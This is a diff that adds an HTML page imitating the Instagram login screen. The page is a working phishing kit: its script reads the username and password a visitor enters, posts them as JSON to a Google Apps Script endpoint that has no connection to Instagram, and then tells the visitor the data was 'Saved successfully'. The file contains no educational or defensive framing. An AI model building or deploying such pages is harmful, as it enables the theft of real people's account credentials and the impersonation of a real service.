@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            width: 350px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+        }
+        .login-container img {
+            width: 180px;
+            margin: 20px 0;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background: #fafafa;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            border-radius: 5px;
+        }
+        .or {
+            margin: 15px 0;
+            position: relative;
+        }
+        .or::before, .or::after {
+            content: "";
+            display: block;
+            width: 40%;
+            height: 1px;
+            background: #dbdbdb;
+            position: absolute;
+            top: 50%;
+        }
+        .or::before { left: 0; }
+        .or::after { right: 0; }
+        .forgot-password {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        <input type="text" id="username" placeholder="Username or Email">
+        <input type="password" id="password" placeholder="Password">
+        <button>Log In</button>
+        <p id="error-message" class="error-message">Wrong username or password</p>
+        <div class="or">OR</div>
+        <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <script>
+        document.querySelector("button").addEventListener("click", async () => {
+            let username = document.querySelector("#username").value;
+            let password = document.querySelector("#password").value;
+
+            let response = await fetch("https://script.google.com/macros/s/AKfycbwzgH975IBVncMXjMXVW_ExvBapcQ0EYsslR3mgpS97RiY-LJ56N-BTffui9hJ3Yb4q/exec", {  
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username, password })
+            });
+
+            if (response.ok) {
+                alert("Saved successfully! ✅");
+            } else {
+                alert("Error connecting to the server ❌");
+            }
+        });
+    </script>
+</body>
+</html>
